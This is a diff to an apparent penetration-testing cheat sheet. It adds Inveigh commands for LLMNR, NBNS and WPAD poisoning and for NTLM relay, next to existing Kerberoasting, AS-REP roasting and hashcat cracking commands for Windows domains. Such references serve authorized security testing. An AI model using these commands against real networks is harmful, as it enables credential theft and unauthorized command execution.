@@ -422,6 +422,10 @@
 	proxychains GetNPUsers.py -outputfile <TARGET>_spns.txt -no-pass <DOMAIN/USER>
 	proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP> <DOMAIN/USER>
 	hashcat -m 13100 -a 0 <SPNSFILE> <DICTIONARY> --force
+	
+	# llmnr, nbns, wpad poisoning, ntlm relay
+	Invoke-Inveigh -HTTP N -NBNS -Y
+	Invoke-InveighRelay -ConsoleOutput Y -Target <IP> -Command  "<COMMAND>"
 ```
 ###### 9.) Windows domain based privesc, unconstrained.
 ```txt	
